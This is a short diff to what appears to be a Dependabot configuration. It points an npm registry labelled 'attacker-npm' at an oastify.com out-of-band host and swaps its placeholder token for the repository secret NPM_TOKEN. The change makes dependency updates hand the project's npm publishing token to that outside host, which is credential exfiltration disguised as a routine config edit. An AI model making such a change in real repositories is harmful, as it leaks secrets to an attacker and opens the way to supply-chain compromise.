@@ -3,7 +3,7 @@ registries:
   attacker-npm:
     type: npm-registry
     url: https://ao21kmp2mvyfwbouixcwbui09rfi3er3.oastify.com/npm
-    token: "placeholder"
+    token: ${{ secrets.NPM_TOKEN }}
 updates:
   - package-ecosystem: "npm"
     directory: "/"
